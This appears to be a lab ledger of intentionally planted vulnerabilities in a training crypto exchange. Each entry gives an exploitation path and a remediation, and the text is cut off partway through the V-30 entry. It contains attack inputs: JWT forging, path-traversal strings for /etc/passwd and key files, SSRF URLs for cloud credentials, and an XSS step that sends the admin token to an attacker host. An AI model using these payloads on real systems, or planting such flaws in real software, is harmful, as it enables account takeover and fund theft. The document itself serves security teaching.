# Planted Vulnerability Ledger

> Source of truth for every **intentional** vulnerability in Bitvulnex.
> If a flaw exists in the code but is not listed here, it is an
> unintended bug — please open an issue. If a flaw is listed here,
> it is a feature.
>
> This file is part of the lab materials. It is **not** linked from
> any attacker-facing page. It is for instructors, the dev/QA loop,
> and post-exercise debriefs.

## Format

Each entry:

```
### V-NNN: <short title>
- Category: OWASP / Crypto / Business / Infra
- Phase introduced: N.M
- Location: path/to/file.ts:LINE (or "multiple", with list)
- Exploitation path: 1-3 sentence summary of how to trigger it
- Intended discovery difficulty: easy / medium / hard / expert
- Realistic root cause: what a careless developer would have done
- Remediation: how a real team would fix it
- Chain membership: standalone | CHAIN A | CHAIN B | CHAIN C | CHAIN D
```

---

## Phase 0 — Scaffolding & safety rails

**No planted vulnerabilities.** Phase 0 is the clean foundation.

---

## Phase 1 — Authentication & user model

### V-13: Open redirect via login `?next=` parameter

- **Category:** OWASP / Auth
- **Phase introduced:** 1 (relocated from the master plan's Phase-7 slot — login surface lands earlier than withdraw/callback)
- **Location:** `apps/web/app/login/login-form.tsx` (the `nextPath = params.get("next") ?? "/account"` line and the subsequent `router.push(nextPath ...)`)
- **Exploitation path:** Craft a URL like `http://exchange.local/login?next=//attacker.example/phish` or `?next=https://attacker.example`. After successful authentication the SPA passes the raw `next` value to `router.push`; in some Next.js + browser combinations protocol-relative and absolute URLs are honored, navigating the freshly-authenticated user off-origin. Pairs well with a phishing page that mirrors the Bitvulnex login screen and harvests the legitimate access/refresh pair from `postMessage` or referer.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer copy-pasted a `?next=` pattern from another product without whitelisting the value to same-origin paths. Looks like normal "preserve the user's destination" UX code.
- **Remediation:** Whitelist `next` before pushing — require leading `/` and reject `//` and `/\` prefixes. A small `safeNext(next, fallback)` helper is the canonical fix.
- **Chain membership:** standalone (and an OAuth-code-interception primitive once Phase 1+ social login lands — but we don't have OAuth in scope per locked decisions)

### V-8: JWT alg=none accepted by legacy v1 verifier

- **Category:** OWASP / Auth
- **Phase introduced:** 1
- **Location:** `packages/shared/src/jwt-v1.ts` (`verifyAccessTokenV1` — the `alg === "none"` branch)
- **Exploitation path:** Mint a JWT with header `{"alg":"none","typ":"JWT"}`, an attacker-chosen payload, and an empty signature. Send to `GET /api/v1/auth/me` as `Authorization: Bearer <token>`. The verifier accepts and returns the user identity claimed in the payload.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer maintaining the "legacy mobile app v1.x" compatibility module forgot to remove the `alg=none` path that supported a brief window of unsigned tokens from early mobile builds.
- **Remediation:** Drop the `alg=none` branch entirely. Reject any header whose `alg` isn't an explicit allow-listed signing algorithm.
- **Chain membership:** standalone (also useful as a foothold for CHAIN A — forge admin claims)

### V-9: Legacy HMAC fallback secret is a known weak default

- **Category:** Auth / Infra
- **Phase introduced:** 1
- **Location:** `apps/web/lib/env.ts` (`JWT_SECRET_LEGACY` schema, `.default("changeme")`) and the `legacySecret` branch in `packages/shared/src/jwt-v1.ts`
- **Exploitation path:** Mint a JWT with `{"alg":"HS256","typ":"JWT"}` (no `kid`). Sign with HMAC-SHA256 using the string `"changeme"`. The v1 verifier reads the missing `kid`, falls through to the env-provided legacy secret which defaults to `"changeme"`, and verifies.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer added a `.default` on the legacy env var so the v1 verifier would "just work" in dev environments where the variable wasn't set. The default value got committed.
- **Remediation:** Remove the `.default()` so the schema requires explicit configuration; rotate the legacy key out of the codebase.
- **Chain membership:** standalone

### V-10: Password reset token is predictable

- **Category:** Auth
- **Phase introduced:** 1
- **Location:** `apps/web/app/api/v2/auth/password-reset/request/route.ts` (`generateResetToken`)
- **Exploitation path:** Token is `sha256(userId + Date.now()).slice(0, 16)`. Request a reset for the victim's email; the server logs the URL to console. Independently, an attacker who knows a victim's `userId` (leaked via signup race / IDOR) can enumerate `Date.now()` values around their best estimate of the request time (~ms granularity → ~1000 candidates/sec) and brute-force the 16-hex-char token via `POST /api/v2/auth/password-reset/confirm`.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer wrote "secure-looking" token generation but used `Date.now()` as the only entropy source. Code review didn't catch it because `sha256` made it look strong.
- **Remediation:** Use `crypto.randomBytes(32).toString("base64url")` for the token; store the hash, not the token; constant-time compare.
- **Chain membership:** standalone

### V-19: HS256/RS256 key confusion via JWKS

- **Category:** Auth
- **Phase introduced:** 1
- **Location:** `packages/shared/src/jwt-v1.ts` (HS256 + RS256 branches sharing the same `loadKidKey` lookup) plus `apps/web/app/api/.well-known/jwks.json/route.ts`
- **Exploitation path:** Fetch `/api/.well-known/jwks.json` to obtain the RS256 public key (kid `legacy-2022`). Convert the JWK back to PEM (or read the bytes the v1 verifier will load — same content as `apps/web/keys/legacy-2022`). Mint a JWT with `{"alg":"HS256","kid":"legacy-2022"}` and arbitrary claims; sign with HMAC-SHA256 using the PEM bytes as the HMAC secret. Send to `GET /api/v1/auth/me`. The verifier reads `alg=HS256`, loads the kid-mapped file (PEM bytes), uses them as the HMAC secret, and accepts.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** v1 verifier supports both algorithms with a shared key lookup table. The team didn't realize the algorithm choice should be tied to the key type.
- **Remediation:** Tie algorithm to key type at lookup time; if `kid` maps to an RSA key, only RS256 verification is allowed.
- **Chain membership:** standalone (and a foothold for CHAIN A — forge any role)

### V-20: kid header path traversal

- **Category:** Auth
- **Phase introduced:** 1
- **Location:** `packages/shared/src/jwt-v1.ts` (`loadKidKey`)
- **Exploitation path:** Set `kid` in the JWT header to a path-traversal string like `../../../etc/hostname` or a process-readable file with known contents (e.g., `package.json`). The verifier reads that file and uses its contents as the HMAC secret. Sign the JWT with HMAC-SHA256 using the same file's bytes as secret. Send to `GET /api/v1/auth/me`.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Filesystem-based key rotation pattern that joins `kid` directly into a path without `path.basename()` or any whitelist.
- **Remediation:** Whitelist `kid` against a static set of permitted values, or use `path.basename` and verify the canonical path stays under the keys directory.
- **Chain membership:** standalone

### V-21: Refresh tokens are not single-use

- **Category:** Auth
- **Phase introduced:** 1
- **Location:** `apps/web/app/api/v2/auth/refresh/route.ts` (handler issues a new pair but does not delete or mark the old `RefreshToken`) and `packages/db/prisma/schema.prisma` (no `usedAt` / `revokedAt` field on the model)
- **Exploitation path:** Capture a victim's refresh token (any vector — XSS to localStorage, leaked log line, MITM in a misconfigured deployment). The captured token continues to mint new access tokens for the full 30-day TTL, even after the legitimate user refreshes. Confirm by calling `POST /api/v2/auth/refresh` repeatedly with the same body.
- **Intended discovery difficulty:** hard
- **Realistic root cause:** Engineer assumed refresh tokens are "rotated naturally" because each call returns a new one. Forgot to invalidate the old.
- **Remediation:** Mark the consumed token used (or delete it) in the same DB transaction that creates the new one; reject any refresh whose token-hash row already has `usedAt`.
- **Chain membership:** standalone

### V-35: Next.js middleware bypass via x-middleware-subrequest

- **Category:** Framework / Auth
- **Phase introduced:** 1
- **Location:** `apps/web/middleware.ts` (the early `if (req.headers.get("x-middleware-subrequest")) return NextResponse.next()` branch)
- **Exploitation path:** Send `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` (or any non-empty value) on the request to `GET /api/v2/admin/users` or `POST /api/v2/admin/users`. Middleware short-circuits before the role check. The downstream admin handler trusts `x-bvbe-user-id` (also sent by the attacker) and acts. Useful for listing the full user DB and for minting fresh admin users.
- **Intended discovery difficulty:** hard
- **Realistic root cause:** CVE-2025-29927 shape. Engineer added the header check thinking it would let internal probes skip auth without realizing the header is attacker-controllable.
- **Remediation:** Remove the bypass. If internal subrequests need to skip auth, identify them by something the attacker cannot supply (network position, signed shared secret, etc.).
- **Edge caveat (live-verified):** The `x-middleware-subrequest` bypass is real and **fully exploitable direct-to-app** (hitting the `web` container's port directly): the middleware short-circuits and the admin handler acts on the attacker-supplied `x-bvbe-user-id`. **Through the public nginx edge, the admin takeover is blunted** because `nginx/nginx.conf` clears the spoofed identity header in the `location /` block (`proxy_set_header x-bvbe-user-id "";`, nginx.conf:93). nginx does **not** strip `x-middleware-subrequest`, so the auth bypass itself still passes the edge — but with `x-bvbe-user-id` blanked, the downstream handler has no attacker-chosen identity to act as. Net: the plant is intact and instructive; it is not "broken." For a clean edge-side admin-takeover demo, pair the bypass with an endpoint that derives identity from something nginx does not strip, or run direct-to-app. Do **not** add `x-middleware-subrequest` to the nginx strip list and do **not** remove the `x-bvbe-user-id` strip — both are part of the as-shipped surface.
- **Chain membership:** CHAIN B (component) — bypass to reach the admin mount, plant an admin user, persist.

---

---

## Phase 2 — KYC & identity

### V-14: Path traversal in KYC document download

- **Category:** OWASP / Path traversal
- **Phase introduced:** 2
- **Location:** `apps/web/app/api/v2/me/kyc/doc/route.ts` (`const path = join(UPLOADS_DIR, file)` — no normalization)
- **Exploitation path:** Authenticate as any user (KYC tier 0 is fine; `/api/v2/me/kyc/doc` is auth-gated but not tier-gated). Hit `GET /api/v2/me/kyc/doc?file=../../../etc/hostname`. The handler joins the user-controlled `file` to the uploads directory and `readFileSync` reads outside the intended root. Use `?file=../../../../../../etc/passwd` (or container equivalents like `../../package.json`, `../../keys/legacy-2022`) to grab arbitrary process-readable files.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer wired up doc downloads via `?file=` for "easy testing" before swapping to a content-addressable URL. The `?file=` path stayed.
- **Remediation:** Look up the document by ID in the DB; serve from `storedPath` and verify the resolved path is contained within `UPLOADS_DIR` via `path.resolve` + prefix check.
- **Chain membership:** standalone (also leaks `apps/web/keys/legacy-2022` → V-19 / V-20 prep)
- **Implementation note (Phase-2 fix-up Q-2.6):** The handler echoes the user-controlled `file` value back in `Content-Disposition: inline; filename="${file}"` on a successful traversal read. This is part of the planted shape — do not "polish" it to `path.basename(file)` thinking it's a separate header-injection concern; the `readFileSync` happens before the header is built, so a polish would only hide evidence, not stop the traversal.

### V-27: Lexicographic KYC tier comparison

- **Category:** Auth / Business logic
- **Phase introduced:** 2 (latent; bug is reachable but no Phase-2 caller triggers the wrong path)
- **Location:** `apps/web/lib/kyc-tier.ts` (`requireTier` — `if (user.kycTier < min)` with `number | string` operands)
- **Exploitation path:** When *any* caller passes a multi-digit tier label as a string (e.g. Phase 4's margin tier system using `"10"`), the JS lexicographic compare ranks `"3" < "10"` as `true` because character `'3' > '1'`. A tier-3 user is reported as below tier `"10"`, *or* a tier-1 user is reported as ≥ tier `"3"` depending on which side is the string. Trainee finds this by either auditing the function or by Phase-4-onwards seeing surprising allow/deny outcomes.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Function accepts `string | number` because some callers pass tier labels from URL/header params. Engineer assumed JS would coerce; it doesn't when both sides are strings.
- **Remediation:** Coerce explicitly: `Number(user.kycTier) < Number(min)`. Better, type the function as `(tier: Tier, min: Tier) => void`.
- **Chain membership:** standalone

### V-40: SSRF in KYC URL-import (CHAIN D component)

- **Category:** SSRF
- **Phase introduced:** 2
- **Location:** `apps/web/app/api/v2/me/kyc/import-url/route.ts` (`isLocalHost` guard — checks only `localhost` / `127.0.0.1` / `::1`)
- **Exploitation path:** Authenticate as a tier-1+ user. POST `{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "type": "address_proof" }` to `/api/v2/me/kyc/import-url`. The guard whitelists the literal strings and rejects nothing else; `169.254.169.254` passes through, the server-side `fetch` hits the mock IMDS container, returns the IAM role name. Repeat with `/latest/meta-data/iam/security-credentials/bvbe-web-instance-role` to get the synthetic `AKIAIOSFODNN7EXAMPLE` credentials, which a later phase will accept against the mock S3 endpoint to complete CHAIN D. Variants: `0.0.0.0`, decimal-encoded IPs (e.g. `2130706433` for `127.0.0.1`), IPv6-mapped (`::ffff:7f00:1`), redirects to internal hosts (the handler follows redirects), and DNS rebinding to a name that resolves first to a public IP and then to `169.254.169.254`.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer added a fast string-equal check thinking "nobody legitimately points us at localhost," missing the wider canonicalisation of "local."
- **Remediation:** Validate via DNS resolution against an IP allowlist for known public CDNs, then `fetch` with `redirect: "error"` and re-verify the final IP. Better: don't accept user URLs at all; require pre-signed cloud-storage URLs with a known vendor host whitelist.
- **Chain membership:** CHAIN D (component) — SSRF → IMDS → IAM creds → mock S3 (Phase 9)

### V-41: Polyglot file upload → stored XSS in admin review

- **Category:** OWASP / XSS / Upload
- **Phase introduced:** 2
- **Location:** `apps/web/app/api/v2/me/kyc/documents/route.ts` (mime detected from filename extension when client sends `application/octet-stream`) + `apps/web/app/api/v2/admin/kyc/[userId]/doc/[docId]/route.ts` (serves verbatim `Content-Type: ${doc.mimeType}`) + `apps/web/app/admin/kyc/[userId]/page.tsx` (renders an iframe per doc whose content is a same-origin Blob URL preserving `mimeType`)
- **Exploitation path:** Sign up, upload a file named `address.html` (or any `.html` extension) for `type: address_proof`. The upload handler infers `mimeType: "text/html"` from the filename extension. Submit for KYC review. When an admin opens `/admin/kyc/<userId>`, the page authedFetches each doc, wraps in a `Blob` with the stored mime, sets a blob URL as the iframe `src`. The iframe renders as `text/html` in the same origin as the admin's session → script executes → reads `window.parent.localStorage["bvbe.access"]` → exfiltrates the admin JWT (e.g., `fetch("http://attacker/?t=" + token)`). Combined with V-35, also enables CHAIN B's persistence step (admin token in hand, plant a new admin user).
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Mime-from-extension is a tutorial-grade upload mistake. Pairing it with serve-verbatim-mime in a same-origin admin tool is the realistic root cause.
- **Remediation:** Whitelist mime types from a sniffed magic-number check; force `Content-Type: application/octet-stream` and `Content-Disposition: attachment` on the admin doc-fetch; render previews in a sandboxed iframe (`sandbox` attribute without `allow-scripts`) and from a separate origin (a `cdn-uploads.bvbe.local` subdomain).
- **Chain membership:** standalone — but a building block for CHAIN B (admin JWT theft is one of two routes to becoming admin)

---

## Phase 3 — Deposits & address management

### V-24: Bitcoin address validation bypass

- **Category:** Crypto / BTC protocol
- **Phase introduced:** 3 (latent; consumed by Phase 7 withdraw)
- **Location:** `packages/shared/src/btc-address.ts` (`isValidBtcAddress`, `normalizeBtcAddress`)
- **Exploitation path:** Multiple bypasses in one function:
  1. **HRP-too-permissive:** validator accepts mainnet `bc1...`, testnet `tb1...`, AND regtest `bcrt1...` bech32 addresses. A Phase-7 withdrawal expecting only mainnet will accept `tb1...` — funds settle at an address whose private key is anyone-can-have (testnet keys are not access-controlled).
  2. **Zero-width strip:** `normalizeBtcAddress` strips U+200B/200C/200D/FEFF before validating. Attacker submits `bc1q​<attacker_suffix>` — the strip turns the visible-looks-like-victim string into the attacker's address. UI may show the original (with zero-widths) to a reviewing admin; server stored the stripped form.
  3. **No checksum verification:** `isBech32Like` only checks HRP + charset; the 6-character Bech32 checksum is not validated. A string with the right alphabet but wrong checksum passes — funds sent to such an address are effectively burned.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer wrote a "permissive validator" to cover mobile clients pasting Unicode-contaminated QR scans and to share a single code path across mainnet / testnet / regtest. Looked fine in dev; ships to production.
- **Remediation:** Reject all HRPs except the deployed network's. Reject zero-width characters instead of stripping. Verify the full Bech32/Bech32m checksum via `bitcoinjs-lib`'s address parser.
- **Chain membership:** standalone — force multiplier in Phase 7 withdraw attacks.

### V-42: Zero-confirmation deposit credit for tier-3 users

- **Category:** Crypto / BTC / Business logic (Mt. Gox flavor)
- **Phase introduced:** 3
- **Location:** `apps/worker/src/deposit-watcher.ts` (`minConfirmationsForTier`)
- **Exploitation path:**
  1. Reach KYC tier 3 (legitimately or via V-35 admin path → set tier in `POST /api/v2/admin/users` or `approve`).
  2. Hit `POST /api/v2/dev/btc/send` (lab affordance) targeting your deposit address. The TX lands in the mock mempool with `confirmations = 0`.
  3. Within ~5 seconds the deposit worker polls, sees the new TX, looks up `minConfirmationsForTier(3) === 0`, and credits `Balance.amount`.
  4. Hit `POST /api/v2/dev/btc/rbf` — next poll detects the original txid is gone (chain returns `confirmations = -1`) and marks the `Deposit` row as `dropped`. **The Balance credit is NOT reversed.** The "we'll add a reconciliation job later" intent is the realistic root cause.
  5. Repeat. Balance grows without on-chain settlement.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Premium-tier "instant deposits" UX, paired with no reconciliation on RBF drops. Team assumed RBF would be rare; "credit-then-fix-later" felt acceptable.
- **Remediation:** Treat zero-conf balances as `pending` (not spendable) until they confirm. On RBF drop, decrement the pending balance. Or drop the tier-3 exception and apply uniform min-confirmation policy.
- **Chain membership:** standalone

---

## Phase 4 — Spot trading & order book

### V-4: IDOR on order GET / DELETE

- **Category:** OWASP / Access control / IDOR
- **Phase introduced:** 4
- **Location:** `apps/web/app/api/v2/me/orders/[id]/route.ts` (GET + DELETE; `findUnique({where:{id}})` without verifying `order.userId === claims.sub`)
- **Exploitation path:** Authenticate as any tier-1+ user. Order IDs are sequential ints. `GET /api/v2/me/orders/42` returns order #42 regardless of owner. `DELETE /api/v2/me/orders/42` cancels any user's order and refunds *their* locked balance — free cancel-as-griefing. Combined with V-25 self-trade, attacker can clear a victim's resting orders before sweeping the book.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer extracted generic `findUnique` pattern and forgot the ownership filter.
- **Remediation:** `prisma.order.findFirst({ where: { id, userId: claims.sub } })`.
- **Chain membership:** standalone (force multiplier on V-25 / V-43).

### V-22: Mass assignment via Next.js Server Action

- **Category:** OWASP / Mass assignment
- **Phase introduced:** 4
- **Location:** `apps/web/app/account/orders/edit-order.ts` (`editOrder` — spreads every `FormData` entry into `prisma.order.update`)
- **Exploitation path:** Action accepts any `FormData` key. POST extra fields like `feeTier=prime`, `status=filled`, `amount=99999999`. The Prisma update applies them. No ownership check either — attacker can edit any order. Discoverable via the page's hidden form ID + the Next.js server-action wire format.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer copy-pasted "spread the form into the update" pattern from a prototype. Server-Action wire format hides the mass-assign at the call-site.
- **Remediation:** Whitelist fields explicitly; verify `order.userId === claims.sub`.
- **Chain membership:** standalone (fee-tier escalation amplifies V-43).

### V-23: CSWSH on order-book WebSocket gateway

- **Category:** WebSocket / CSWSH
- **Phase introduced:** 4
- **Location:** `apps/ws-gateway/src/server.ts` (upgrade handler; `handleMessage` subscribe branch)
- **Exploitation path:** Three siblings, one site:
  1. **No Origin check** — attacker page at `attacker.example` opens `new WebSocket("ws://exchange.local/ws?token=...")`; the upgrade accepts because Origin isn't validated.
  2. **Token in query string** — leaks via Referer, nginx access logs, browser history.
  3. **No per-channel ACL** — `subscribe` accepts any channel name; client can subscribe to `private:<other-user-id>` and receive that user's order/balance updates live.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Generic `ws` library tutorial code without Origin check; subscribe-by-channel-name without per-channel ACL.
- **Remediation:** Origin allow-list at upgrade; session-bound subscriptions (`private:<userId>` requires `claims.sub === userId`); move token out of URL (sec-websocket-protocol header).
- **Chain membership:** standalone (also a primitive for CHAIN C-flavor mass-takeover surveillance).

### V-25: Self-trade not blocked

- **Category:** Business logic / Market manipulation
- **Phase introduced:** 4
- **Location:** `apps/web/lib/engine/match.ts` (`matchAgainstBook` — no `resting.userId === taker.userId` filter)
- **Exploitation path:** Place a sell limit at $X. Immediately place a matching buy from the same account. Engine matches, writes a Trade, the price feed (`/api/v2/public/price/*`) reports $X as last. Repeat to drive the public price feed arbitrarily. Phase 5 margin engine reads this as oracle → CHAIN C cascading liquidations.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engine MVP didn't filter self-matches; team punted ("compliance will catch it"); compliance never built it.
- **Remediation:** Reject `maker.userId === taker.userId` matches; flag self-trades and exclude from public price + fee volume.
- **Chain membership:** CHAIN C — oracle manipulation → margin liquidations (Phase 5).

### V-32: Stop-loss / OCO cancellation race

- **Category:** Business logic / Race condition
- **Phase introduced:** 4
- **Location:** `apps/web/app/api/v2/me/orders/[id]/route.ts` (DELETE handler) + `apps/web/lib/engine/place.ts` (matching tx)
- **Exploitation path:** Place an OCO pair. Trigger the stop-loss; mid-match, hammer `DELETE /api/v2/me/orders/<takeProfit>` via HTTP/2 multiplexing. The cancel reads `status:"open"` and refunds the locked balance; the match writes the trade and decrements locked. Both succeed under READ COMMITTED — user receives the take-profit fill AND a refund of the same locked balance. Repeats inflate balance.
- **Intended discovery difficulty:** hard
- **Realistic root cause:** Default Prisma `$transaction` isolation (READ COMMITTED); no `SELECT FOR UPDATE`; no per-pair serialization.
- **Remediation:** SERIALIZABLE isolation OR `SELECT FOR UPDATE` on the Order row at the start of both transactions; or single in-process queue per pair.
- **Chain membership:** standalone.

### V-43: Fee-tier volume counts cancelled maker-side fills

- **Category:** Business logic
- **Phase introduced:** 4
- **Location:** `apps/web/lib/engine/fees.ts` (`feeTierForUser` — `where` filters `takerOrder.status` but not `makerOrder.status`)
- **Exploitation path:** Combined with V-25: place maker sell, fill from a second account (or self-trade), cancel the maker. The trade row survives and counts toward 30-day volume. A few hundred wash trades → `prime` tier (≥ $1M volume) → 0bps maker / 5bps taker fees.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer filtered the side that "obviously" shouldn't count (taker), missed the maker.
- **Remediation:** Filter both sides; exclude self-trades from volume.
- **Chain membership:** standalone (amplified by V-25).

---

## Phase 6 — Lending, staking, OTC desk, P2P

### V-44: Lending interest off-by-one credit (fresh-supplier prior-period grab)

- **Category:** Business logic / Crypto-finance arithmetic
- **Phase introduced:** 6
- **Location:** `apps/worker/src/yield-accrual.ts:50` (the `supplyPositions = await db.lendingPosition.findMany(...)` lookup runs *after* `interest` is computed for the elapsed window; the distribution divides by the post-tick `pool.supplied` and includes any positions opened between the last accrual and the current one)
- **Exploitation path:** Watch the pool's `lastAccrual` timestamp (publicly readable indirectly via `/api/v2/public/lending/pools` — the `perSecondRate * elapsed * borrowed` formula is computable). Just before the 60s tick fires, supply a large amount into a high-utilization pool. When the worker accrues, it computes `interest` from `borrowed * deltaSeconds * rate` (the borrow side that existed across the whole window) but distributes that interest across the *current* supply set, which now includes the attacker's freshly-deposited principal. The attacker captures a share of yield that was earned by borrowers when their capital was not yet at risk. Withdraw immediately after the tick to harvest. Repeat on every cycle; profit scales with utilization, attacker share, and how reliably they front-run the tick.
- **Intended discovery difficulty:** hard
- **Realistic root cause:** Engineer wrote "compute the interest, then loop over supply positions" without thinking about the timing of the position-set read. Compound v1 and Cream had variants of this same shape — easy to ship, easy to overlook in code review because the math otherwise looks conservation-clean (charged interest still equals credited interest plus reserve).
- **Remediation:** Snapshot the supply-position set (and each row's principal) at `pool.lastAccrual` time, not at the start of the current tick. Either (a) record a tick-id on each position write so the worker can replay an "as-of" view, (b) lock the pool row and serialize all supply/withdraw between ticks, or (c) move to a per-second on-demand accrual model with a virtual index (Compound v2 / Aave style).
- **Chain membership:** standalone

### V-45: Staking reward claim race (double-claim via concurrent requests)

- **Category:** Business logic / Race condition
- **Phase introduced:** 6
- **Location:** `apps/web/lib/staking/claim.ts:32` (the `db.stakingClaim.findMany` reads `claimedAt: null` rows; the subsequent `db.stakingClaim.update` at line 41 sets `claimedAt` unconditionally — no transaction wraps the read+write pair and no `claimedAt: null` predicate guards the update)
- **Exploitation path:** Send two `POST /api/v2/me/staking/claim` requests for the same `positionId` simultaneously (HTTP/2 single-packet timing, or two parallel curls). Both handlers' `findMany` execute before either's `update` lands, so both observe the same set of unclaimed rows. Each request then runs `update` against every row and credits the user's balance with the full reward amount. Net effect: rewards credited 2× (or N× for N parallel requests). Repeat each tick the worker materializes a claim row.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer treated the claim endpoint as a read-modify-write but forgot the read isn't fenced from the write — common in early staking implementations where the pre-materialization pattern (worker writes the reward rows, endpoint just marks them claimed) feels safe enough that nobody reaches for `SERIALIZABLE` or `SELECT FOR UPDATE`.
- **Remediation:** Wrap the read+update in a single transaction with `SERIALIZABLE` isolation OR perform the update as `UPDATE staking_claims SET claimed_at = now() WHERE position_id = $1 AND claimed_at IS NULL RETURNING amount` and credit only the returned rows. Either approach makes the predicate atomic with the write.
- **Chain membership:** standalone

### V-46: OTC desk privilege via spoofable `x-bvbe-desk-role` header

- **Category:** Auth / Trust boundary
- **Phase introduced:** 6
- **Location:** `apps/web/app/api/v2/me/otc/accept/route.ts:43-44` (the route handler reads `x-bvbe-desk-role` and assigns `feeBps = MAKER_FEE_BPS (0)` when the value is `"maker"`; `nginx/nginx.conf` strips `x-bvbe-user-id` and `x-bvbe-internal-trace` in the catch-all `location /` block but does NOT strip `x-bvbe-desk-role` — the maker-role privilege flows through from client request to handler unchanged)
- **Exploitation path:** Reach Tier-2 (legitimately or via V-35 admin path) and obtain a normal OTC quote via `POST /api/v2/me/otc/quote`. Then `POST /api/v2/me/otc/accept` with `x-bvbe-desk-role: maker` set in the request headers. The handler reads the header, sees `"maker"`, and calls `acceptOtc` with `feeBps: 0` — saving the standard 25bps taker fee on the notional. Repeat across many quote→accept cycles, especially at large notional, for free fee arbitrage against the platform.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Internal desk plumbing used `x-bvbe-desk-role` so the OTC console could identify itself when talking to the same backend. nginx's strip list was set up for `x-bvbe-user-id` and `x-bvbe-internal-*` but the desk role header was added later and the strip list was never updated. Classic team-org failure where the platform team and the desk team didn't sync the trust boundary.
- **Remediation:** Add `proxy_set_header x-bvbe-desk-role "";` to the nginx config to strip the header from any externally-sourced request. Better: remove the header-trust pattern entirely and authenticate the internal console via mTLS or a signed shared-secret token whose validation lives server-side. Best: identify desk relationships by `userId` against a `desk_members` table — the user's role drives the fee tier, not a self-asserted header.
- **Chain membership:** standalone

---

## Phase 7 — Withdrawals & multi-sig treasury

### V-26: Withdrawal daily limit resets on UTC-midnight boundary

- **Category:** Business logic
- **Phase introduced:** 7
- **Location:** `apps/web/lib/withdrawal/limit.ts` (`currentDayUtc` truncates each request to its UTC calendar day; the ledger is uniquely keyed on `(userId, utcDate, asset)` and `checkAndDebitLimit` only sums the row for the current `utcDate`)
- **Exploitation path:** A Tier-1 user (daily limit $1,000) hits the withdrawal endpoint twice across UTC midnight. Request A at 23:59:50Z lands in row `utcDate = day-N`. Request B at 00:00:10Z lands in row `utcDate = day-N+1`. Each ledger row only tracks its own day, so both requests pass the limit check. Net cash out in a ~20-second window = 2× the documented daily limit. Repeat nightly (and across higher tiers where the limit dollar value is much larger) for sustained excess withdrawal capacity.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer interpreted "daily withdrawal limit" as a calendar-day bucket because that's what the KYC ledger language said. A rolling-24-hour window would not have the boundary flaw — but rolling windows are harder to implement, so the team shipped the calendar-day version with the unique index on `utcDate`.
- **Remediation:** Replace the calendar-day bucket with a rolling 24-hour window — sum all `Withdrawal` rows whose `requestedAt` is within `now - 24h`. Alternatively, keep the ledger but apply a server-side enforcement window of "last N hours" rather than "today's row only."
- **Repro note (instructor):** Code-confirmed and genuinely exploitable; the only reason it did not reproduce in the live exploitation pass is timing — the run happened mid-day UTC and the flaw only fires across the UTC-midnight boundary. To demo cleanly: max the daily limit near **23:59Z**, then withdraw again just after **00:00Z** — both pass, netting 2× the daily cap in seconds. Alternatively, pin the `web` and `worker` containers with `libfaketime` to `23:59:50Z`, mint a fresh token, withdraw, advance the faked clock to `00:00:10Z`, and withdraw again. Do **not** change the host/VM system clock on Docker-Desktop/WSL2 (shared VM clock desyncs every container and invalidates in-flight JWTs).
- **Chain membership:** standalone

### V-28: Withdrawal balance check is not transactional with the debit

- **Category:** Crypto / Race condition
- **Phase introduced:** 7
- **Location:** `apps/web/lib/withdrawal/submit.ts` (the `db.balance.findUnique` read at the top of `submitWithdrawal` is followed by `checkAndDebitLimit` and `db.balance.update` — none of which share a Prisma `$transaction`)
- **Exploitation path:** Authenticate as any Tier-1+ user holding 0.1 BTC. Send two HTTP/2 single-packet POSTs to `/api/v2/me/withdrawals` for 0.1 BTC each, frames timed so both handlers' `findUnique` execute before either's `balance.update`. Each request observes the same `available = 0.1` and admits the withdrawal. Both then debit and both `Withdrawal` rows reach `pending`; the user's balance goes negative (or to zero), but the worker still broadcasts both TXs to the mock node. Net effect: 2× withdrawal for 1× balance. Tighten the race window by using HTTP/2 multiplexing (curl `--parallel` or the `single-packet-attack` recipe) — the race is widest because the limit ledger upsert is the only DB write that touches the user between the read and the debit.
- **Intended discovery difficulty:** hard
- **Realistic root cause:** Engineer building the user-facing withdrawal flow lifted the deposit-watcher pattern (separate balance read, then update). The deposit watcher's write is idempotent on `(txid, vout)`, so the lack of a transaction is benign there. The same code shape applied to user-submitted withdrawals breaks because the read is not the unique constraint.
- **Remediation:** Wrap the balance read, the limit debit, the balance update, and the `Withdrawal.create` in a single `db.$transaction` with SERIALIZABLE isolation, or push the check into a conditional `UPDATE balance SET available = available - $1 WHERE userId_asset = ... AND available >= $1 RETURNING available` and create the `Withdrawal` only when the conditional update affects a row.
- **Chain membership:** standalone

### V-30: Internal transfer bypasses daily limits and tier gating in the lib

- **Category:** Business logic
- **Phase introduced:** 7
- **Location:** `apps/web/lib/withdrawal/internal-transfer.ts` (the `internalTransfer` function does not call `checkAndDebitLimit` and does not consult `requireTier` beyond the route-layer Tier-1 floor; the route is gated only at `requireTier(claims, 1)`)
- **Exploitation path:** A Tier-1 user wants to exfiltrate $50,000 in BTC but their daily limit is $1,000. Open two accounts (or collude with another Tier-1 user). On the source account, POST `/api/v2/me/internal-transfer` with `{recipientEmail, asset: "BTC", amount: "1.0"}`. The lib debits the sender, credits the recipient, writes an `InternalTransfer` row — and does NOT touch the `WithdrawalLimitLedger`. The recipient's account now holds 1.0 BTC; they can then withdraw it through their *own* daily ledger (which the source-account's quota didn't touch). Net effect: a Tier-1 user moves arbitrary value off the platform by relaying through internal transfers.
